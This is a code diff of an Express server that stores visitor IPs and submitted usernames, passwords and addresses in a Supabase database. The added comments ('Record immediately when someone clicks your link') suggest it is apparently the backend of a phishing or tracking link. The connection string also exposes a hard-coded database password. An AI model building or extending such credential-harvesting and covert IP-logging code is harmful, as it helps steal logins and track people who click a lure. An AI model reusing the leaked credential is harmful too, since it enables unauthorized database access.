@@ -11,6 +11,7 @@ const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -28,13 +29,14 @@ function saveRecord(type, username = null, password = null, address = null, ip =
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
     );
+    console.log(`📍 SAVED → ${type} | IP: ${ip}`);
 }
 
-// Record Page Visit Immediately
+// MAIN LINK - Record immediately when someone clicks your link
 app.get('/', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = req.ip || req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
-    console.log(`📍 Page Visit Recorded | IP: ${ip}`);
+    console.log("🔴 MAIN LINK CLICKED! Someone opened your website.");
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
@@ -67,5 +69,5 @@ app.post('/api/clear', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 Server running on Vercel`);
 });
